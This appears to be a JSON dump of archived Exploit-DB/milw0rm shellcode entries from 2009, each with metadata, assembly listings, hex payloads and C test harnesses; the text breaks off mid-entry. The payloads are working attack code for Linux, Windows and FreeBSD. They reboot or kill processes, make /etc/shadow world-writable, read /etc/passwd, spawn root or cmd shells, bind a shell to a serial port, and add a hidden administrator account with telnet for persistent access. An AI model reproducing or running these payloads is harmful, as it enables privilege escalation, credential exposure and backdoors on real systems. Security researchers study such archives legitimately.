{"Title": "Linux/x86 - reboot() + PUSH Shellcode (30 bytes)", "Author": "Jonathan Salwan", "Published": ": 2009-01-16", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13327.c", "View": "https://old.exploit-db.com/raw/13327/", "code": ["/*  Linux x86 PUSH reboot() - 30 bytes", " *  Jonathan Salwan <js.rac.projet[*AT]gmail.com>", " *  Web: http://racprojet.zapto.org", " *", " * Disassembly of section .text:", " *", " * 08048054 <.text>:", " * 8048054:       31 c0                   xor    %eax,%eax", " * 8048056:       50                      push   %eax", " * 8048057:       68 62 6f 6f 74          push   $0x746f6f62", " * 804805c:       68 6e 2f 72 65          push   $0x65722f6e", " * 8048061:       68 2f 73 62 69          push   $0x6962732f", " * 8048066:       89 e3                   mov    %esp,%ebx", " * 8048068:       50                      push   %eax", " * 8048069:       89 e2                   mov    %esp,%edx", " * 804806b:       53                      push   %ebx", " * 804806c:       89 e1                   mov    %esp,%ecx", " * 804806e:       b0 0b                   mov    $0xb,%al", " * 8048070:       cd 80                   int    $0x80", " *", " */", "", "main()", "{", "char shellcode[] = ", "\t\t\t\"\\x31\\xc0\"", "\t\t\t\"\\x50\"", "\t\t\t\"\\x68\\x62\\x6f\\x6f\\x74\"", "\t\t\t\"\\x68\\x6e\\x2f\\x72\\x65\"", "\t\t\t\"\\x68\\x2f\\x73\\x62\\x69\"", "\t\t\t\"\\x89\\xe3\"", "\t\t\t\"\\x50\"", "\t\t\t\"\\x89\\xe2\"", "\t\t\t\"\\x53\"", "\t\t\t\"\\x89\\xe1\"", "\t\t\t\"\\xb0\\x0b\"", "\t\t\t\"\\xcd\\x80\";", "", "       \tprintf(\"Length: %d\\n\",strlen(shellcode));", "\t(*(void(*)()) shellcode)();       ", "}", "", "// milw0rm.com [2009-01-16]"]},
{"Title": "Windows/x86 (XP SP2) - cmd.exe Shellcode (57 bytes)", "Author": "Stack", "Published": ": 2009-02-03", "Platform": "Windows_x86", "Download": "https://old.exploit-db.com/download/13511.c", "View": "https://old.exploit-db.com/raw/13511/", "code": ["/*", "win32/xp sp2 cmd.exe 57 bytes", "Author : Mountassif Moad", "Big Thnx : Houssamix :d", "Assembly Code : Secret", "Changed by : Stack", "Description : It is 57 Byte Shellcode which Execute Cmd.exe Tested Under Windows Xp SP2", "*/", "#include <stdlib.h>", "#include <string.h>", "unsigned char shellcode[] =", "\"\\xB8\\xFF\\xEF\\xFF\\xFF\\xF7\\xD0\\x2B\\xE0\\x55\\x8B\\xEC\"", "\"\\x33\\xFF\\x57\\x83\\xEC\\x04\\xC6\\x45\\xF8\\x63\\xC6\\x45\"", "\"\\xF9\\x6D\\xC6\\x45\\xFA\\x64\\xC6\\x45\\xFB\\x2E\\xC6\\x45\"", "\"\\xFC\\x65\\xC6\\x45\\xFD\\x78\\xC6\\x45\\xFE\\x65\\x8D\\x45\"", "\"\\xF8\\x50\\xBB\\xC7\\x93\\xBF\\x77\\xFF\\xD3\";", "int main ()", "{", "int *ret;", "ret=(int *)&ret+2;", "printf(\"Shellcode Length is : %d\",strlen(shellcode));", "(*ret)=(int)shellcode;", "return 0;", "}", "", "// milw0rm.com [2009-02-03]"]},
{"Title": "Linux/x86 - killall5 Shellcode (34 bytes)", "Author": "Jonathan Salwan", "Published": ": 2009-02-04", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13326.c", "View": "https://old.exploit-db.com/raw/13326/", "code": ["/*", "   Linux x86 | killall5", "   Shellcode 34 bytes", "   Author: Jonathan Salwan <js.rac.projet [AT] gmail.com", "   Web: http://pollydevstorm.zapto.org", "", "   killall5 is the SystemV killall command. It sends a signal to all processes ", "   except the processes in its own session, so it won't kill the shell that is ", "   running the script it was called from. Its primary (only) use is in the rc ", "   scripts found in the /etc/init.d directory.", "", "", "Disassembly of section .text:", "", "08048054 <.text>:", " 8048054:       31 c0                   xor    %eax,%eax", " 8048056:       50                      push   %eax", " 8048057:       66 68 6c 35             pushw  $0x356c", " 804805b:       68 6c 6c 61 6c          push   $0x6c616c6c", " 8048060:       68 6e 2f 6b 69          push   $0x696b2f6e", " 8048065:       68 2f 73 62 69          push   $0x6962732f", " 804806a:       89 e3                   mov    %esp,%ebx", " 804806c:       50                      push   %eax", " 804806d:       89 e2                   mov    %esp,%edx", " 804806f:       53                      push   %ebx", " 8048070:       89 e1                   mov    %esp,%ecx", " 8048072:       b0 0b                   mov    $0xb,%al", " 8048074:       cd 80                   int    $0x80", "", "*/", "", "#include \"stdio.h\"", "", "int main(int argc, char *argv[])", "{", "", "\tchar shellcode[] = \t\"\\x31\\xc0\\x50\\x66\\x68\\x6c\"", "\t\t\t\t\"\\x35\\x68\\x6c\\x6c\\x61\\x6c\"", "\t\t\t\t\"\\x68\\x6e\\x2f\\x6b\\x69\\x68\"", "\t\t\t\t\"\\x2f\\x73\\x62\\x69\\x89\\xe3\"", "\t\t\t\t\"\\x50\\x89\\xe2\\x53\\x89\\xe1\"", "\t\t\t\t\"\\xb0\\x0b\\xcd\\x80\";", "", "\tprintf(\"Length: %d\\n\",strlen(shellcode));", "\t(*(void(*)()) shellcode)();", "\t", "\treturn 0;", "}", "", "// milw0rm.com [2009-02-04]"]},
{"Title": "Linux/x86 - chmod 666 /etc/shadow + exit(0) Shellcode (30 bytes)", "Author": "Jonathan Salwan", "Published": ": 2009-02-20", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13325.c", "View": "https://old.exploit-db.com/raw/13325/", "code": ["/*", "   Linux/x86 - chmod(\"/etc/shadow\",666) & exit(0)", "   \t", "\tInfo reg", "        ------------------", "   \t%eax = 15", "   \t%ebx = /etc/shadow", "   \t%ecx = 666", "", "        %eax = 1", "        %ebx = 0", "   ", "   Shellcode 30 bytes", "   Author: Jonathan Salwan < submit [AT] shell-storm.org >", "   Web: http://www.shell-storm.org", "", " Disassembly of section .text:", "", " 08048054 <.text>:", " 8048054:\t51                   \tpush   %ecx", " 8048055:\t66 b9 b6 01          \tmov    $0x1b6,%cx", " 8048059:\t68 61 64 6f 77       \tpush   $0x776f6461", " 804805e:\t68 63 2f 73 68       \tpush   $0x68732f63", " 8048063:\t68 2f 2f 65 74       \tpush   $0x74652f2f", " 8048068:\t89 e3                \tmov    %esp,%ebx", " 804806a:\t6a 0f                \tpush   $0xf", " 804806c:\t58                   \tpop    %eax", " 804806d:\tcd 80                \tint    $0x80", " 804806f:\t40                   \tinc    %eax", " 8048070:\tcd 80                \tint    $0x80", "", "*/", "", "#include \"stdio.h\"", "", "int main(int argc, char *argv[])", "{", "", "\tchar shellcode[] = \t\"\\x51\\x66\\xb9\\xb6\"", "\t\t\t\t\"\\x01\\x68\\x61\\x64\"", "\t\t\t\t\"\\x6f\\x77\\x68\\x63\"  // chmod(\"/etc/shadow\",666)", "\t\t\t\t\"\\x2f\\x73\\x68\\x68\"", "\t\t\t\t\"\\x2f\\x2f\\x65\\x74\"", "\t\t\t\t\"\\x89\\xe3\\x6a\\x0f\"", "\t\t\t\t\"\\x58\\xcd\\x80\"", "", "\t\t\t\t\"\\x40\\xcd\\x80\";     // exit(0);", "", "\tprintf(\"Length: %d\\n\",strlen(shellcode));", "\t(*(void(*)()) shellcode)();", "\t", "\treturn 0;", "}", "", "// milw0rm.com [2009-02-20]"]},
{"Title": "Windows/x86 (XP SP2) (French) - cmd.exe Shellcode (32 bytes)", "Author": "Stack", "Published": ": 2009-02-20", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-149.php", "View": null, "code": ["/*", "windows/XP sp2 (FR) Sellcode cmd.exe 32 bytes", "Author : Mountassif Moad", "Big Thnx : Houssamix & SimO-s0fT", "Changed by : Stack", "Description : It is 32 Byte Shellcode which Execute Cmd.exe Tested Under Windows Xp SP2 FR", "My first original shellcode Here http://www.milw0rm.com/shellcode/7971", "because i receive every day full message who insult me (you'r lamer - fucker ->", "you dont understand anything abouts sec )  infinity of insult", "and the last time i receive an message have  => i make full error in my first shelcode & in the end he", "insult my mother & me (shit)", "so i tell all people when want insult anyone remembers we are just human not angel", "euuuh : i'm decide to write another small shellcode this time just for fun (32 bytes xd )", "Assembly Code : this time is not a secret (:@)", "00402000   8BEC             MOV EBP,ESP", "00402002   33FF             XOR EDI,EDI", "00402004   57               PUSH EDI", "00402005   C645 FC 63       MOV BYTE PTR SS:[EBP-4],63", "00402009   C645 FD 6D       MOV BYTE PTR SS:[EBP-3],6D", "0040200D   C645 FE 64       MOV BYTE PTR SS:[EBP-2],64", "00402011   C645 F8 01       MOV BYTE PTR SS:[EBP-8],1", "00402015   8D45 FC          LEA EAX,DWORD PTR SS:[EBP-4]", "00402018   50               PUSH EAX", "00402019   B8 C793BF77      MOV EAX,msvcrt.system (i notice this for work in other machine)", "0040201E   FFD0             CALL EAX", "*/", "#include \"stdio.h\"", "unsigned char shellcode[] =", "\"\\x8B\\xEC\\x33\\xFF\\x57\"", "\"\\xC6\\x45\\xFC\\x63\\xC6\\x45\"", "\"\\xFD\\x6D\\xC6\\x45\\xFE\\x64\"", "\"\\xC6\\x45\\xF8\\x01\\x8D\"", "\"\\x45\\xFC\\x50\\xB8\\xC7\\x93\"", "\"\\xBF\\x77\\xFF\\xD0\";", "int main ()", "{", "int *ret;", "ret=(int *)&ret+2;", "printf(\"Shellcode Length is : %d\\n\",strlen(shellcode));", "(*ret)=(int)shellcode;", "return 0;", "}", "", "// milw0rm.com [2009-02-20]"]},
{"Title": "Windows/x86 - PEB!NtGlobalFlags Shellcode (14 bytes)", "Author": "Koshi", "Published": ": 2009-02-24", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-156.php", "View": null, "code": ["/*", "", " PEB!NtGlobalFlags ( 14 BYTES )", " Author: Koshi", " Description: Uses PEB method to determine whether a debugger is", "\t      attached to the running proccess or not. No 9x. :(", " Length: 14 Bytes", " Registers Used: EAX,ESI,ESP", " Compiled: jpXV34dd3v09Fh", "", "*/", "", "/*", "", " 00401000 >   6A 70          PUSH 70", " 00401002     58             POP EAX", " 00401003     56             PUSH ESI", " 00401004     333464         XOR ESI,DWORD PTR SS:[ESP]", " 00401007     64:3376 30     XOR ESI,DWORD PTR FS:[ESI+30]", " 0040100B     3946 68        CMP DWORD PTR DS:[ESI+68],EAX", "\t\t\t     JE DebuggerPresent ( If equal debugger attached )", "*/", "", "unsigned char Shellcode[] =", "{\"\\x6A\\x70\\x58\\x56\\x33\\x34\\x64\"", "\"\\x64\\x33\\x76\\x30\\x39\\x46\\x68\"};", "", "", "", "int main( int argc, char *argv[] )", "{", " printf( \"Shellcode is %u bytes.\\n\", sizeof(Shellcode)-1 );", " printf( Shellcode, sizeof(Shellcode) );", " return 0;", "}", "", "// milw0rm.com [2009-02-24]"]},
{"Title": "Linux/x86 - Read /etc/passwd Shellcode (65+ bytes)", "Author": "certaindeath", "Published": ": 2009-02-27", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-73.php", "View": null, "code": ["/*", "Linux/x86 file reader.", "", "65 bytes + pathname", "Author: certaindeath", "", "Source code:", "_start:", "\txor\t%eax, %eax", "\txor\t%ebx, %ebx", "\txor\t%ecx, %ecx", "\txor\t%edx, %edx", "\tjmp\ttwo", "", "one:", "\tpop\t%ebx", "\t", "\tmovb\t$5, %al", "\txor\t%ecx, %ecx", "\tint\t$0x80", "\t", "\tmov\t%eax, %esi", "\tjmp\tread", "", "exit:", "\tmovb\t$1, %al", "\txor\t%ebx, %ebx", "\tint\t$0x80", "", "read:", "\tmov\t%esi, %ebx", "\tmovb\t$3, %al", "\tsub\t$1, %esp", "\tlea\t(%esp), %ecx", "\tmovb\t$1, %dl", "\tint\t$0x80", "", "\txor\t%ebx, %ebx", "\tcmp\t%eax, %ebx", "\tje\texit", "", "\tmovb\t$4, %al", "\tmovb\t$1, %bl", "\tmovb\t$1, %dl", "\tint\t$0x80", "\t", "\tadd\t$1, %esp", "\tjmp\tread", "", "two:", "\tcall\tone", "\t.string\t\"file_name\"", "*/", "char main[]=", "\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\"", "\"\\xeb\\x32\\x5b\\xb0\\x05\\x31\\xc9\\xcd\"", "\"\\x80\\x89\\xc6\\xeb\\x06\\xb0\\x01\\x31\"", "\"\\xdb\\xcd\\x80\\x89\\xf3\\xb0\\x03\\x83\"", "\"\\xec\\x01\\x8d\\x0c\\x24\\xb2\\x01\\xcd\"", "\"\\x80\\x31\\xdb\\x39\\xc3\\x74\\xe6\\xb0\"", "\"\\x04\\xb3\\x01\\xb2\\x01\\xcd\\x80\\x83\"", "\"\\xc4\\x01\\xeb\\xdf\\xe8\\xc9\\xff\\xff\"", "\"\\xff\"", "\"/etc/passwd\"; //Put here the file path, default is /etc/passwd", "", "// milw0rm.com [2009-02-27]"]},
{"Title": "Windows/x86 - Add Administrator User (GAZZA/123456) + Start Telnet Service Shellcode (111 bytes)", "Author": "DATA_SNIPER", "Published": ": 2009-02-27", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-148.php", "View": null, "code": ["; payload:add admin acount & Telnet Listening", "; Author: DATA_SNIPER", "; size:111 bytes", "; platform:WIN32/XP SP2 FR", "; thanks:Arab4services team & AT4RE Team", "; more info: visit my blog http://datasniper.arab4services.net", "; The Sh3llcode:", "; \"\\xEB\\x08\\xBA\\x4D\\x11\\x86\\x7C\\xFF\\xD2\\xCC\\xE8\\xF3\\xFF\\xFF\\xFF\\x63\\x6D\\x64\\x20\\x2F\\x63\"", "; \"\\x20\\x6E\\x65\\x74\\x20\\x75\\x73\\x65\\x72\\x20\\x68\\x69\\x6C\\x6C\\x20\\x31\\x32\\x33\\x34\\x35\"", "; \"\\x36\\x20\\x2F\\x41\\x44\\x44\\x20\\x26\\x26\\x20\\x6E\\x65\\x74\\x20\\x6C\\x6F\\x63\\x61\\x6C\\x67\"", "; \"\\x72\\x6F\\x75\\x70\\x20\\x41\\x64\\x6D\\x69\\x6E\\x69\\x73\\x74\\x72\\x61\\x74\\x65\\x75\\x72\\x73\"", "; \"\\x20\\x68\\x69\\x6C\\x6C\\x20\\x2F\\x41\\x44\\x44\\x20\\x26\\x26\\x20\\x73\\x63\\x20\\x73\\x74\\x61\"", "; \"\\x72\\x74\\x20\\x54\\x6C\\x6E\\x74\\x53\\x76\\x72\\x00\"", "; Description: it's simular to TCP BindShell on port 23,throught Command execution we can get shell access throught telnet service on Windows b0x.", "; Add admin account command user=GAZZA ,pass=123456 :cmd /c net user GAZZA 123456 /ADD && net localgroup Administrateurs GAZZA /ADD", "; Start telnet service: sc start TlntSvr", "; For saving ur access to the B0x again and again :),u can use this command:", "; \"sc config TlntSvr start= auto &  sc start TlntSvr\" instead of:", "; \"sc start TlntSvr\"", "; NASM -s -fbin telnetbind.asm", "BITS 32 ", "db 0EBh,08h    ;such as \"jmp Data\" ,i puted it in opcode format for avoiding null problem.", "Exec:", "MOV EDX,7C86114Dh ;WinExec addr in WIN XP SP2 FR", "CALL EDX", "INT3 ;just interrupter (hung the shellcode after it do his job,any way u can use ExitProcess) for avoiding infinite loop", "Data:", "CALL Exec", "db 'cmd /c net user GAZZA 123456 /ADD & net localgroup Administrateurs GAZZA /ADD & sc start TlntSvr',00h", ";add user GAZA with 123456 password and start telnet service ;BTW the exstension cuted for saving som byte ;)", "", "; milw0rm.com [2009-02-27]"]},
{"Title": "Linux/x86 - File Unlinker Shellcode (18+ bytes)", "Author": "darkjoker", "Published": ": 2009-03-03", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-75.php", "View": null, "code": ["/*", "Author    : darkjoker", "Site      : http://darkjoker.net23.net", "Shellcode : linux/x86 File unlinker 18 bytes + file path length", "", "        .global _start", "_start:", "        jmp     one", "", "two:", "        pop     %ebx", "        movb    $0xa,%al", "        int     $0x80", "", "        movb    $0x1, %al", "        xor     %ebx, %ebx", "        int     $0x80", "", "one:", "        call    two", "        .string \"file\"", "*/", "", "char main [] =", "\"\\xeb\\x0b\\x5b\\xb0\\x0a\\xcd\\x80\\xb0\"", "\"\\x01\\x31\\xdb\\xcd\\x80\\xe8\\xf0\\xff\"", "\"\\xff\\xff\"", "\"file\" //Here file path to delete", "", "// milw0rm.com [2009-03-03]"]},
{"Title": "Linux/x86 - Perl Script Execution Shellcode (99+ bytes)", "Author": "darkjoker", "Published": ": 2009-03-03", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-74.php", "View": null, "code": ["/*", "Author    : darkjoker", "Site      : http://darkjoker.net23.net", "Shellcode : linux/x86 Perl script execution 99 bytes + script length", "", "", "        .global _start", "", "_start:", "        xor     %eax, %eax", "        xor     %ebx, %ebx", "        xor     %ecx, %ecx", "        xor     %edx, %edx", "        xor     %edi, %edi", "        xor     %esi, %esi", "        push    %eax", "        push    $0x6c702e30", "        push    $0x30307470", "        push    $0x69726373", "", "        mov     %esp, %ebx", "        movb    $0x5, %al", "        movb    $0x41, %cl", "        int     $0x80", "        jmp     one", "", "two:", "", "        mov     %ebx, %esi", "        mov     %eax, %ebx", "", "        pop     %edi", "", "        push    %edi", "", "\t// Begin http://www.int80h.org/strlen/", "\txor     %ecx, %ecx", "        xor     %eax, %eax", "        not     %ecx", "        repne   scasb", "        not     %ecx", "        dec     %ecx", "\t// End   http://www.int80h.org/strlen/", "", "        pop     %edi", "        mov     %ecx, %eax", "        mov     %edi, %ecx", "        mov     %eax, %edx", "", "        movb    $0x4, %al", "        int     $0x80", "", "        movb    $0x6, %al", "        int     $0x80", "", "        mov     %esi, %ebx", "        movb    $0xf, %al", "        movw    $0x1fc, %cx", "        int     $0x80", "", "        movb    $0xb, %al", "        xor     %ecx, %ecx", "        xor     %edx, %edx", "        int     $0x80", "", "        movb    $0x1, %al", "        xor     %ebx, %ebx", "        int     $0x80", "", "one:", "        call    two", "        .string \"#!/usr/bin/perl\\nprint (\\\"Hello world!\\\\n\\\");\\n\"", "*/", "char main [] = ", "\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\"", "\"\\x31\\xff\\x31\\xf6\\x50\\x68\\x30\\x2e\"", "\"\\x70\\x6c\\x68\\x70\\x74\\x30\\x30\\x68\"", "\"\\x73\\x63\\x72\\x69\\x89\\xe3\\xb0\\x05\"", "\"\\xb1\\x41\\xcd\\x80\\xeb\\x38\\x89\\xde\"", "\"\\x89\\xc3\\x5f\\x57\\x31\\xc9\\x31\\xc0\"", "\"\\xf7\\xd1\\xf2\\xae\\xf7\\xd1\\x49\\x5f\"", "\"\\x89\\xc8\\x89\\xf9\\x89\\xc2\\xb0\\x04\"", "\"\\xcd\\x80\\xb0\\x06\\xcd\\x80\\x89\\xf3\"", "\"\\xb0\\x0f\\x66\\xb9\\xfc\\x01\\xcd\\x80\"", "\"\\xb0\\x0b\\x31\\xc9\\x31\\xd2\\xcd\\x80\"", "\"\\xb0\\x01\\x31\\xdb\\xcd\\x80\\xe8\\xc3\"", "\"\\xff\\xff\\xff\"", "\"#!/usr/bin/perl\\nprint (\\\"Hello world!\\\\n\\\");\\n\"; // Here script source", "", "// milw0rm.com [2009-03-03]"]},
{"Title": "Windows/x86 - Egg Omelet SEH Shellcode", "Author": "Skylined", "Published": ": 2009-03-16", "Platform": "Windows_x86", "Download": null, "View": null, "code": ["A small piece of shellcode written in assembler that can scan the user-land", "address space for small blocks of memory (\"eggs\") and recombine the eggs into", "one large block. When done, the large block is executed. This is useful when you", "can only insert small blocks at random locations into a process and not one", "contiguous large block containing your shellcode in one piece: this code will", "recombine the eggs to create your shellcode in the process and execute it.", "", "This version works only on Windows 32-bit platforms because it uses the Windows", "specific Structured Exception Handler (SEH) feature to handle access violations", "caused by scanning memory.", "", "More details can be found here:", "", "http://skypher.com/wiki/index.php?title=Shellcode/w32_SEH_omelet_shellcode", "http://code.google.com/p/w32-seh-omelet-shellcode/", "backup: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/13507-1.zip (2009-w32-SEH-omlet-shellcode-v0.2.zip)", "backup: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/13507-2.zip (2009-w32-SEH-omlet-shellcode-older-versions.zip)", "", "I have not had a chance to test this newer version in a live exploit, so do", "let me know if you have a chance to use it.", "", "Cheers,", "SkyLined ", "", "# milw0rm.com [2009-03-16]"]},
{"Title": "FreeBSD x86 / x64 - execve(/bin/sh) Anti-Debugging Shellcode (140 bytes)", "Author": "c0d3_z3r0", "Published": ": 2009-04-13", "Platform": "FreeBSD", "Download": "http://shell-storm.org/shellcode/files/shellcode-103.php", "View": null, "code": ["/*", "", "ELF - FreeBSD Execve /bin/sh - Anti-Debugging - i386/AMD64", "", "c0d3_z3r0 < anderson_underground@hotmail.com ; andersonc0d3@gmail.com >", "", "http://anderson.hacknroll.com", "http://blog.hacknroll.com", "", "\\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x09\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00", "\\x02\\x00\\x03\\x00\\x01\\x00\\x00\\x00\\x74\\x80\\x04\\x08\\x34\\x00\\x00\\x00", "\\xa8\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x34\\x00\\x20\\x00\\x02\\x00\\x28\\x00", "\\x05\\x00\\x04\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x04\\x08", "\\x00\\x80\\x04\\x08\\x8b\\x00\\x00\\x00\\x8b\\x00\\x00\\x00\\x05\\x00\\x00\\x00", "\\x00\\x10\\x00\\x00\\x01\\x00\\x00\\x00\\x8c\\x00\\x00\\x00\\x8c\\x90\\x04\\x08", "\\x8c\\x90\\x04\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00", "\\x00\\x10\\x00\\x00\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69", "\\x6e\\x89\\xe3\\x50\\x54\\x53\\x50\\xb0\\x3b\\xcd\\x80\\x44", "", "c0d3labs# uname -p", "i386", "c0d3labs# perl -e 'print \"\\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x09\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x03\\x00\\x01\\x00\\x00\\x00\\x74\\x80\\x04\\x08\\x34\\x00\\x00\\x00\\xa8\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x34\\x00\\x20\\x00\\x02\\x00\\x28\\x00\\x05\\x00\\x04\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x04\\x08\\x00\\x80\\x04\\x08\\x8b\\x00\\x00\\x00\\x8b\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x01\\x00\\x00\\x00\\x8c\\x00\\x00\\x00\\x8c\\x90\\x04\\x08\\x8c\\x90\\x04\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x54\\x53\\x50\\xb0\\x3b\\xcd\\x80\\x44\"' > binary", "c0d3labs# ./binary", "# exit", "c0d3labs# objdump -d binary", "objdump: binary: File truncated", "c0d3labs# gdb -q binary", "\"/usr/home/andersonc0d3/elf/binary\": not in executable format: File truncated", "(gdb) q", "c0d3labs# file binary", "binary: ELF 32-bit LSB executable, Intel 80386, version 1 (FreeBSD), statically linked, stripped", "c0d3labs#", "", "c0d3labs64# uname -p", "amd64", "c0d3labs64# perl -e 'print \"\\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x09\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x03\\x00\\x01\\x00\\x00\\x00\\x74\\x80\\x04\\x08\\x34\\x00\\x00\\x00\\xa8\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x34\\x00\\x20\\x00\\x02\\x00\\x28\\x00\\x05\\x00\\x04\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x04\\x08\\x00\\x80\\x04\\x08\\x8b\\x00\\x00\\x00\\x8b\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x01\\x00\\x00\\x00\\x8c\\x00\\x00\\x00\\x8c\\x90\\x04\\x08\\x8c\\x90\\x04\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x54\\x53\\x50\\xb0\\x3b\\xcd\\x80\\x44\"' > binary64", "c0d3labs64# ./binary64", "# exit", "c0d3labs64#", "", "*/", "", "# milw0rm.com [2009-04-13]"]},
{"Title": "Linux/x86 - Serial Port Shell Binding (/dev/ttyS0) + busybox Launching Null-Free Shellcode (82 bytes)", "Author": "phar", "Published": ": 2009-04-30", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13321.c", "View": "https://old.exploit-db.com/raw/13321/", "code": ["/*", "General:", "\tSerial port shell binding, busybox launching shellcode.. yey!", "", "Specific:", "\t*really* wish i could tell you what i needed this for.. but meh..", "", "\tthis will bind a busybox sh shell to /dev/ttyS0, the shellcode ", "does not alter the baudrate settings.. 9600 is the default, but its easy enough to cycle though if were ", "at a different baud rate.", "", "", "...damn how long has it been since i posted one of these?", "", "happy hunting", "", "", "-phar", "     @", "       stonedcoder", "mdavis             .", "      @              org", "        ioactive", "                 .", "                   com", "", "main:", " 31 d2                   xor    %edx,%edx", " 31 c0                   xor    %eax,%eax", " 6a 02                   push   $0x2\t\t\t #flags O_RDW\t\t", " 59                      pop    %ecx", " 66 b8 53 30             mov    $0x3053,%ax", " 50                      push   %eax", " 68 2f 74 74 79          push   $0x7974742f\t\t#port device", " 68 2f 64 65 76          push   $0x7665642f", " 89 e3                   mov    %esp,%ebx", " 6a 05                   push   $0x5", " 58                      pop    %eax", " 89 c6                   mov    %eax,%esi", " cd 80                   int    $0x80\t\t\t#open", " 89 c6                   mov    %eax,%esi", " 31 c9                   xor    %ecx,%ecx", "", "dup2_loop:\t\t\t\t\t\t#set the serial port as our console", " 89 f3                   mov    %esi,%ebx", " 6a 3f                   push   $0x3f", " 58                      pop    %eax", " cd 80                   int    $0x80\t\t\t#dup2", " 41                      inc    %ecx", " 80 f9 03                cmp    $0x3,%cl", " 75 f3                   jne    80483a7 dup2_loop", " 66 b8 73 68             mov    $0x6873,%ax", " 50                      push   %eax", " 89 e1                   mov    %esp,%ecx", " 52                      push   %edx", " 51                      push   %ecx", " 89 e1                   mov    %esp,%ecx", " 52                      push   %edx", " 68 79 62 6f 78          push   $0x786f6279\t\t#/bin/busybox", " 68 2f 62 75 73          push   $0x7375622f", " 68 2f 62 69 6e          push   $0x6e69622f", " 89 e3                   mov    %esp,%ebx", " 6a 0b                   push   $0xb", " 58                      pop    %eax", " cd 80                   int    $0x80\t\t\t#execve", "*/", "", "", "", "", "", "int main() {", "char shellcode[] = {", "\"\\x31\\xd2\\x31\\xc0\\x6a\\x02\\x59\\x66\\xb8\\x53\\x30\\x50\\x68\\x2f\\x74\\x74\"", "\"\\x79\\x68\\x2f\\x64\\x65\\x76\\x89\\xe3\\x6a\\x05\\x58\\x89\\xc6\\xcd\\x80\\x89\"", "\"\\xc6\\x31\\xc9\\x89\\xf3\\x6a\\x3f\\x58\\xcd\\x80\\x41\\x80\\xf9\\x03\\x75\\xf3\"", "\"\\x66\\xb8\\x73\\x68\\x50\\x89\\xe1\\x52\\x51\\x89\\xe1\\x52\\x68\\x79\\x62\\x6f\"", "\"\\x78\\x68\\x2f\\x62\\x75\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x6a\\x0b\\x58\"", "\"\\xcd\\x80\"};", "char cnull = 0;", "", "        printf(\"shellcode_size: %u\\n\", sizeof(shellcode));", "        printf(\"contains nulls: \");", "        if(!memmem(shellcode,sizeof(shellcode),&cnull,1)){", "                printf(\"yes\\n\");", "        }else{", "                printf(\"no\\n\");", "        }", "\t(*(void(*)()) shellcode)();  ", "}", "", "// milw0rm.com [2009-04-30]"]},
{"Title": "Linux/x64 - setuid(0) + execve(/bin/sh) Shellcode (49 bytes)", "Author": "evil.xi4oyu", "Published": ": 2009-05-14", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-77.php", "View": null, "code": ["/*", "setuid(0) + execve(/bin/sh) - just 4 fun. ", "xi4oyu [at] 80sec.com", " ", "main(){", "__asm(  \"xorq %rdi,%rdi\\n\\t\"", "        \"mov $0x69,%al\\n\\t\"", "        \"syscall \\n\\t\"", "        \"xorq   %rdx, %rdx \\n\\t\"", "        \"movq   $0x68732f6e69622fff,%rbx; \\n\\t\"", "        \"shr    $0x8, %rbx; \\n\\t\"", "        \"push   %rbx; \\n\\t\"", "        \"movq   %rsp,%rdi; \\n\\t\"", "        \"xorq   %rax,%rax; \\n\\t\"", "        \"pushq  %rax; \\n\\t\"", "        \"pushq  %rdi; \\n\\t\"", "        \"movq   %rsp,%rsi; \\n\\t\"", "        \"mov    $0x3b,%al; \\n\\t\"", "        \"syscall ; \\n\\t\"", "        \"pushq  $0x1 ; \\n\\t\"", "        \"pop    %rdi ; \\n\\t\"", "        \"pushq  $0x3c ; \\n\\t\"", "        \"pop    %rax ; \\n\\t\"", "        \"syscall  ; \\n\\t\"", ");", "}", "*/", "main() {", "        char shellcode[] =", "        